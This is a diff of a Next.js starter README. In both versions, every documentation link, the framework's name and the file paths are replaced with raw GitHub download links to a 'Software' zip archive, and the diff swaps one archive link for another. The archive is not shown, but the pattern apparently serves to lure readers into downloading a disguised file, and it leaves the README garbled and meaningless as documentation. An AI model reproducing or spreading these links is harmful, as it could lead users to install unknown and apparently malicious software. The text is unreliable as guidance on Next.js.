@@ -1,4 +1,4 @@
-This is a [https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) project bootstrapped with [`create-next-app`](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip).
+This is a [https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) project bootstrapped with [`create-next-app`](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip).
 
 ## Getting Started
 
@@ -12,23 +12,23 @@ yarn dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip`. The page auto-updates as you edit the file.
+You can start editing the page by modifying `https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip`. The page auto-updates as you edit the file.
 
-[API routes](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) can be accessed on [http://localhost:3000/api/hello](http://localhost:3000/api/hello). This endpoint can be edited in `https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip`.
+[API routes](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) can be accessed on [http://localhost:3000/api/hello](http://localhost:3000/api/hello). This endpoint can be edited in `https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip`.
 
-The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) instead of React pages.
+The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) instead of React pages.
 
 ## Learn More
 
-To learn more about https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip, take a look at the following resources:
+To learn more about https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip, take a look at the following resources:
 
-- [https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip Documentation](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) - learn about https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip features and API.
-- [Learn https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) - an interactive https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip tutorial.
+- [https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip Documentation](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) - learn about https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip features and API.
+- [Learn https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) - an interactive https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip tutorial.
 
-You can check out [the https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip GitHub repository](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) - your feedback and contributions are welcome!
+You can check out [the https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip GitHub repository](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) - your feedback and contributions are welcome!
 
 ## Deploy on Vercel
 
-The easiest way to deploy your https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip app is to use the [Vercel Platform](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) from the creators of https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip
+The easiest way to deploy your https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip app is to use the [Vercel Platform](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) from the creators of https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip
 
-Check out our [https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip deployment documentation](https://raw.githubusercontent.com/AndreNot3000/gem/main/public/Software_v1.6.zip) for more details.
+Check out our [https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip deployment documentation](https://github.com/AndreNot3000/gem/raw/refs/heads/main/pages/Software-1.9.zip) for more details.
